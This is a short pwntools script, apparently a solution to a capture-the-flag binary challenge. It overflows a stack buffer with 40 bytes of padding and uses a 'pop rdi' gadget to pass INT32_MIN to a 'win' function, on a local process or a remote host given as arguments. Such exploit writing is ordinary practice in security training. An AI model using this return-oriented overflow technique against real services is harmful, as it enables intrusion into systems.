from pwn import *
import sys


context.binary = elf = ELF('./chal')
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) > 1 else None
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else None

def start():
    if HOST and PORT:
        return remote(HOST, PORT)
    return process('./chal')

p = start()

pop_rdi = 0x4012b5      # pop rdi; ret
win     = 0x4011f6
INT32_MIN = 0xffffffff80000000  # sign-extended to 64 bits

payload  = b'A' * 40
payload += p64(pop_rdi)
payload += p64(INT32_MIN)
payload += p64(win)

p.recvuntil(b'Hi who is it?')
p.sendline(payload)

p.interactive()
